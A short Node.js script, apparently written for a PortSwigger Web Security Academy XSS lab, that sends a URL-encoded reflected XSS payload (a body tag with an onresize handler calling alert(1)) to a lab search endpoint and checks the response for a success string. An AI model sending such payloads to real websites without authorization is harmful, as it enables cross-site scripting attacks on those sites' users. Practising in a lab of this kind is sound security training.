
var https = require('https')

var success_string = 'search results'

function fuzz (url) {
	return new Promise(function (resolve, reject) {
		var output = ''
		https.get(url, (res) => {
			console.log('url:', url, res.statusCode);
			res.on('data', (d) => {
			output += d.toString()
		});
		res.on('end', function () {
          console.log(output)
		  if (output.includes(success_string)) resolve({ url: url, success: true })
		     else resolve({ url: url, success: false })
		})
		}).on('error', (e) => {
			reject(e);
		});
	})
}

fuzz('https://ac061f791ea8ff838095029600e2009a.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(1)%3E').then(function (url) {
console.log('works ', url)
}).catch(console.log)
